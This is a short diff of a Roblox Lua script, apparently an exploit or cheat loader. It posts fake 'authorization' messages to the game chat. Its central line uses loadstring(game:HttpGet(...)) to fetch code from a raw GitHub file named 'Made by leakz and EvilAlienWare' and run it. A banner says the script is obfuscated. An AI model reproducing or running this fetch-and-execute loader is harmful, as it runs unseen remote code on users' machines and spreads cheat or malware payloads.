@@ -1,7 +1,6 @@
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Checking for authorized.. | rejected_VX", "All")
 task.wait(2)
 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Rejected_VX | Authorized.", "All")
-
 local Players = game:GetService('Players')
 local localPlayer = Players.LocalPlayer
 
@@ -9,6 +8,7 @@ print("loaded_VX.lua Authorized.| " .. localPlayer.Name)
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FlavorYT/The-lazy-ONE/main/Made%20by%20leakz%20and%20EvilAlienWare"))()
 task.wait(2.5)
+
 ([[
                      		   This script was obfuscated using YaNansToeFuscator.
 
